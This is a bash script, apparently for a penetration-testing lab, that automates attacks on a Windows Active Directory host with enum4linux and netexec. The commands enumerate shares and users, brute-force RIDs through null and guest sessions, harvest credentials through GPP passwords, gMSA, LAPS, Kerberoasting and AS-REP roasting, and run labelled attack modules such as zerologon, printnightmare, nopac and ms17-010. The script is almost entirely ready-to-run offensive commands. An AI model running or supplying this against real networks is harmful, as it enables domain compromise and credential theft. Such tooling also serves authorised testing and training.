ip="10.129.42.188"
username=""
password=""

# enum4linux
echo -e "=== enum4linux ==="
enum4linux -a -A -u "$username" -p "$password" "$ip" 

# netexec 
echo -e "=== NETEXEC ==="

echo -e "\n[*] Enum smb with netexec (null session)..." 
netexec smb $ip -u '' -p '' --shares 
netexec smb $ip -u 'guest' -p '' --shares 

if [[ -n "$password" ]]; then
	echo -e "\n[*] checking current user smb/winrm/rdp/mssql permission ... " 
	netexec smb $ip -u "$username" -p "$password"   
	netexec winrm $ip -u "$username" -p "$password"  
	netexec rdp $ip -u "$username" -p "$password"    
	netexec mssql $ip -u "$username" -p "$password"  

	echo -e "\n[*] Enum smb share folder ..." 
	netexec smb $ip -u "$username" -p "$password" --shares 
	
	echo -e "\n[*] Enum autologin via smb ..." 
	netexec smb $ip -u "$username" -p "$password" -M gpp_autologin 
	netexec smb $ip -u "$username" -p "$password" -M reg-winlogon
	
	echo -e "\n[*] Enum gpp_password via smb ..." 
	netexec smb $ip -u "$username" -p "$password" -M gpp_password  
	
	echo -e "\n[*] Enum gmsa password ..." 
	netexec ldap $ip -u "$username" -p "$password" --gmsa 
	
	echo -e "\n[*] Bloodhound collecting ..." 
	netexec ldap $ip -u "$username" -p "$password" --bloodhound -c all 
	
	echo -e "\n[*] Enum asreproast ..." 
	netexec ldap $ip -u "$username" -p "$password" --asreproast __netexec_asreproast.txt 
	
	echo -e "\n[*] Enum kerberoasting ..." 
	netexec ldap $ip -u "$username" -p "$password" --kerberoasting __netexec_kerberoasting.txt 

	echo -e "\n[*] ldap-checker via ldap ..." 
	netexec ldap $ip -u "$username" -p "$password" -M ldap-checker 
	
	echo -e "\n[*] Attack : webdav ..." 
	netexec smb $ip -u "$username" -p "$password" -M webdav 
	
	echo -e "\n[*] Attack : printnightmare ..." 
	netexec smb $ip -u "$username" -p "$password" -M printnightmare 
fi

echo -e "\n[*] Attack : nopac ..." 
netexec smb $ip -u "$username" -p "$password" -M nopac

echo -e "\n[*] Attack : spooler ..." 
netexec smb $ip -u "$username" -p "$password" -M spooler 

echo -e "\n[*] Attack: coerce_plus  ..." 
netexec smb $ip -u "$username" -p "$password" -M coerce_plus

echo -e "\n[*] Attack : zerologon (may take 1 minute to complete) ..." 
netexec smb $ip -u "$username" -p "$password" -M zerologon --timeout=60

echo -e "\n[*] Attack : ms17-010 ..." 
netexec smb $ip -u "$username" -p "$password" -M ms17-010 --timeout=60

echo -e "\n[*] Attack : smbghost ..." 
netexec smb $ip -u "$username" -p "$password" -M smbghost 

echo -e "\n[*] Attack : ioxidresolver ..." 
netexec smb $ip -u "$username" -p "$password" -M ioxidresolver 

echo -e "\n[*] Enum AV via smb ..." 
netexec smb $ip -u "$username" -p "$password" -M enum_av 
netexec smb $ip -u "$username" -p "$password" -M wcc

echo -e "\n[*] Enum ADCS ..." 
netexec ldap $ip -u "$username" -p "$password" -M adcs 
netexec smb $ip -u "$username" -p "$password" -M enum_ca 

echo -e "\n[*] Enum enum_trusts ..." 
netexec ldap $ip -u "$username" -p "$password" -M enum_trusts 

echo -e "\n[*] Enum password-not-required ..." 
netexec ldap $ip -u "$username" -p "$password" --password-not-required 

echo -e "\n[*] Enum trusted for delegation and Unconstrained ..." 
netexec ldap $ip -u "$username" -p "$password" --trusted-for-delegation 

echo -e "\n[*] Enum TRUSTED_FOR_DELEGATION  ..." 
netexec ldap $ip -u "$username" -p "$password" --query "(userAccountControl:1.2.840.113556.1.4.803:=524288)" "sAMAccountName"

echo -e "\n[*] Enum TRUSTED_TO_AUTH_FOR_DELEGATION  ..." 
netexec ldap $ip -u "$username" -p "$password" --query "(userAccountControl:1.2.840.113556.1.4.803:=16777216)" "sAMAccountName"

echo -e '\n[*] Enum msds-allowedtodelegateto / Get-netUser -TrustedToAuth ...'
netexec ldap $ip -u "$username" -p "$password" --query "(msds-allowedtodelegateto=*)" "sAMAccountName"

echo -e '\n[*] Enum user account requires a smart card...'
netexec ldap $ip -u "$username" -p "$password" --query "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)" "sAMAccountName"

echo -e '\n[*] Enum user has ENCRYPTED_TEXT_PWD_ALLOWED'
netexec ldap $ip -u "$username" -p "$password" --query "(useraccountcontrol:1.2.840.113556.1.4.803:=128)" "sAMAccountName"

echo -e '\n[*] Enum adminCount = 1'
netexec ldap $ip -u "$username" -p "$password" --query "(adminCount=1)" "sAMAccountName"

echo -e '\n[*] Enum DoesNotRequirePreAuth & adminCount = 1'
netexec ldap $ip -u "$username" -p "$password" --query "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(adminCount=1))" "sAMAccountName"

echo -e "\n[*] Enum pre 2000 computer  ..." 
netexec ldap $ip -u "$username" -p "$password" -M pre2k

echo -e "\n[*] Get-desc-users via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M get-desc-users 

echo -e "\n[*] get-unixUserPassword via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M get-unixUserPassword 

echo -e "\n[*] get-userPassword via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M get-userPassword 

echo -e "\n[*] laps via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M laps 

echo -e "\n[*] MachineAccountQuota via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M maq 

echo -e "\n[*] obsolete via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M obsolete 

echo -e "\n[*] pso via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M pso 

echo "Note: pso module for netexec may have some bug."
echo "Try: $ python3 ldapsearch-ad.py -l $ip -d domain.com -u $username -p $password  -t pass-pols"

echo -e "\n\n[*] subnets via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M subnets 

echo -e "\n[*] user-desc via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M user-desc 

echo -e "\n[*] DC List via ldap ..."
netexec ldap $ip -u "$username" -p "$password" --dc-list

echo -e "=== NETEXEC : More General enumlation ==="

echo -e "\n[*] Enum active user via ldap ..."
netexec ldap $ip -u "$username" -p "$password" --query  "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" "sAMAccountName description" 

echo -e "\n[*] Enum disable user via ldap ..."
netexec ldap $ip -u "$username" -p "$password" --query  "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" "sAMAccountName description" 

echo -e "\n[*] Enum all user via ldap "
netexec ldap $ip -u "$username" -p "$password" --query  "(objectClass=user)" "sAMAccountName description"

echo -e "\n[*] Enum all groups via ldap "
netexec ldap $ip -u "$username" -p "$password" --query  "(objectClass=group)" "sAMAccountName description" 

if [[ -n "$password" ]]; then
	echo -e "[~] No need to brute rid for null session"
else
	echo -e "\n[*] Rid brute via null session(limit to 10000)..." 
	netexec smb $ip -u '' -p '' --rid-brute 10000 
	
	echo -e "\n[*] Rid brute via guest account (limit to 10000)..." 
	netexec smb $ip -u 'guest' -p '' --rid-brute 10000 

	echo -e "\n[*] Enum user via ldap (null session)..." 
	netexec ldap $ip -u '' -p '' --users 
fi
